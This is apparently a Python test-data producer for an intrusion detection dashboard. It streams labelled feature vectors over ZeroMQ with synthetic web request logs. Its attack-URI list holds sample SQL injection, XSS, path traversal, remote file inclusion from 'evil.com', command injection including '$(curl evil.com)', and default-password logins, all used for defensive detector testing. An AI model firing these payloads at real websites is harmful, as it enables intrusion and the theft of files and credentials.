#!/usr/bin/env python3
"""
Compatible Test Log Producer for IDS Dashboard
Converts 15-dimensional features to 10-dimensional features for binary dashboard compatibility
"""

import argparse
import time
import zmq
import numpy as np
import joblib
import random
import sys
from typing import Dict, List, Optional

class CompatibleTestLogProducer:
    def __init__(self, test_data_path: str, zmq_port: int = 5555, shuffle: bool = True):
        """
        Initialize compatible test log producer.

        Args:
            test_data_path: Path to test .npz file
            zmq_port: ZeroMQ port for publishing
            shuffle: Whether to shuffle test data
        """
        self.test_data_path = test_data_path
        self.zmq_port = zmq_port
        self.shuffle = shuffle

        # Load test data
        self.load_test_data()

        # Setup ZeroMQ
        self.setup_zmq()

    def load_test_data(self):
        """Load test data and label encoder."""
        print(f"Loading test data from {self.test_data_path}...")

        with np.load(self.test_data_path, allow_pickle=True) as data:
            self.test_features = data['features']
            self.test_labels = data['labels']
            self.test_indices = data['test_indices']
            self.class_names = data['label_encoder']

        # Convert 15-dimensional features to 10-dimensional features for binary compatibility
        # We'll use the first 10 most important features
        self.test_features_10d = self.test_features[:, :10]

        print(f"Loaded {len(self.test_features)} test samples")
        print(f"Original feature dimensions: {self.test_features.shape[1]}")
        print(f"Converted to: {self.test_features_10d.shape[1]} features (for binary compatibility)")
        print(f"Classes: {list(self.class_names)}")
        print(f"Label distribution: {np.bincount(self.test_labels)}")

    def setup_zmq(self):
        """Setup ZeroMQ publisher."""
        self.context = zmq.Context()
        self.socket = self.context.socket(zmq.PUB)
        try:
            self.socket.bind(f"tcp://*:{self.zmq_port}")
            print(f"🚀 Compatible test producer started on port {self.zmq_port}")
        except zmq.error.ZMQError:
            print(f"Error: Port {self.zmq_port} is in use. Is another producer running?")
            sys.exit(1)

    def generate_metadata(self, label_idx: int, sample_idx: int) -> Dict:
        """Generate realistic metadata for a test sample."""
        class_name = self.class_names[label_idx]

        # Base metadata
        metadata = {
            'timestamp': time.strftime('%d/%b/%Y:%H:%M:%S %z'),
            'remote_addr': f"192.168.{random.randint(1,255)}.{random.randint(1,255)}",
            'method': 'GET' if random.random() > 0.3 else 'POST',
            'uri': '/',
            'protocol': 'HTTP/1.1',
            'status': '200' if class_name == 'normal' else str(random.choice([403, 404, 500])),
            'user_agent': 'Mozilla/5.0 (Test Client)',
            'true_label': class_name,
            'attack_type': 'attack' if class_name != 'normal' else 'safe',
            'ip': f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"  # Added for dashboard compatibility
        }

        # Generate realistic URIs based on attack type
        if class_name != 'normal':
            metadata['uri'] = self.generate_attack_uri(class_name)
        else:
            metadata['uri'] = self.generate_normal_uri()

        return metadata

    def generate_attack_uri(self, attack_type: str) -> str:
        """Generate realistic attack URIs."""
        uris = {
            'sqli': [
                "/wp-admin/admin-ajax.php?action=test&id=1' OR '1'='1",
                "/login.php?username=admin'--&password=test",
                "/search?q=test' UNION SELECT * FROM users--"
            ],
            'xss': [
                "/search?q=<script>alert('XSS')</script>",
                "/comment.php?text=<img src=x onerror=alert(1)>",
                "/profile.php?name=<script>document.location='evil.com'</script>"
            ],
            'lfi': [
                "/download.php?file=../../../../etc/passwd",
                "/view.php?path=../../../../wp-config.php",
                "/include.php?page=../../../../var/log/apache2/access.log"
            ],
            'rfi': [
                "/include.php?page=http://evil.com/shell.php",
                "/load.php?url=http://malicious-site.com/backdoor.txt",
                "/widget.php?src=http://attacker.com/exploit"
            ],
            'rce': [
                "/upload.php?cmd=ls;cat /etc/passwd",
                "/exec.php?command=whoami&&id",
                "/process.php?input=$(curl evil.com)"
            ],
            'path_traversal': [
                "/files/../../../etc/passwd",
                "/download?path=..%2F..%2F..%2Fetc%2Fpasswd",
                "/view?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
            ],
            'bruteforce': [
                "/wp-login.php?log=admin&pwd=123456",
                "/admin/login.php?username=admin&password=admin",
                "/login?user=root&pass=toor"
            ]
        }

        return random.choice(uris.get(attack_type, ["/possible_attack"]))

    def generate_normal_uri(self) -> str:
        """Generate realistic normal URIs."""
        normal_uris = [
            "/",
            "/wp-admin/",
            "/wp-login.php",
            "/wp-content/themes/style.css",
            "/wp-includes/js/jquery.js",
            "/feed/",
            "/category/technology/",
            "/2024/01/sample-post/",
            "/page/2/",
            "/search?q=wordpress",
            "/contact/",
            "/about/"
        ]
        return random.choice(normal_uris)

    def features_to_list(self, features: np.ndarray) -> List[float]:
        """Convert numpy features to list for JSON serialization."""
        return features.tolist()

    def stream_test_data(self, delay: float = 0.2, limit: Optional[int] = None):
        """Stream test data through ZeroMQ with 10-dimensional features."""
        indices = list(range(len(self.test_features_10d)))

        if self.shuffle:
            random.shuffle(indices)

        print(f"📡 Streaming compatible test data...")
        print(f"   Feature dimensions: {self.test_features_10d.shape[1]} (for binary dashboard)")
        print(f"   Delay: {delay}s between messages")
        if limit:
            print(f"   Limit: {limit} messages")
        print("   Press Ctrl+C to stop\n")

        try:
            for i, idx in enumerate(indices):
                if limit and i >= limit:
                    break

                features = self.test_features_10d[idx]  # Use 10-dimensional features
                label_idx = self.test_labels[idx]

                # Convert features to list for JSON
                features_list = self.features_to_list(features)

                # Generate metadata
                metadata = self.generate_metadata(label_idx, idx)

                # Create payload compatible with binary dashboard
                payload = {
                    'features': features_list,  # 10-dimensional features
                    'metadata': metadata
                }

                # Send via ZMQ (Topic: 'logs')
                self.socket.send_string("logs", flags=zmq.SNDMORE)
                self.socket.send_json(payload)

                # Visual feedback
                attack_indicator = "🔴" if metadata['true_label'] != 'normal' else "🟢"
                print(f"{attack_indicator} {i+1:4d}: {metadata['true_label']:12s} | {metadata['method']:<4s} {metadata['uri'][:60]}")

                time.sleep(delay)

        except KeyboardInterrupt:
            print("\n⏹️  Stopping compatible test producer...")
        finally:
            self.socket.close()
            self.context.term()
            print("✅ Compatible test producer stopped")

    def run_stats(self):
        """Show statistics about the test data."""
        print("\n📊 Test Data Statistics:")
        print(f"Total samples: {len(self.test_features_10d)}")
        print(f"Original feature dimensions: {self.test_features.shape[1]}")
        print(f"Compatible feature dimensions: {self.test_features_10d.shape[1]}")
        print(f"Classes: {list(self.class_names)}")
        print("\nClass distribution:")
        for i, class_name in enumerate(self.class_names):
            count = np.sum(self.test_labels == i)
            percentage = (count / len(self.test_labels)) * 100
            print(f"  {class_name:15s}: {count:6d} ({percentage:5.1f}%)")

def main():
    parser = argparse.ArgumentParser(description="Compatible Test Log Producer for Binary IDS Dashboard")
    parser.add_argument("--test-data", type=str, default="data/processed/modsec_processed_test.npz",
                       help="Path to test data .npz file")
    parser.add_argument("--port", type=int, default=5555,
                       help="ZeroMQ port for publishing")
    parser.add_argument("--delay", type=float, default=0.2,
                       help="Delay between messages in seconds")
    parser.add_argument("--limit", type=int,
                       help="Limit number of messages to send")
    parser.add_argument("--shuffle", action="store_true", default=True,
                       help="Shuffle test data before streaming")
    parser.add_argument("--stats-only", action="store_true",
                       help="Only show statistics, don't stream data")

    args = parser.parse_args()

    # Check if test data exists
    if not args.stats_only and not args.test_data.endswith('_test.npz'):
        print("❌ Error: Please provide a test dataset (should end with '_test.npz')")
        print("   Run train_enhanced_ids.py first to generate test data")
        sys.exit(1)

    try:
        # Initialize producer
        producer = CompatibleTestLogProducer(args.test_data, args.port, args.shuffle)

        if args.stats_only:
            producer.run_stats()
        else:
            # Show stats first
            producer.run_stats()
            print("\n" + "="*50)

            # Stream data
            producer.stream_test_data(args.delay, args.limit)

    except FileNotFoundError:
        print(f"❌ Error: Test data file not found: {args.test_data}")
        print("   Run 'python train_enhanced_ids.py --preprocess --train' first")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()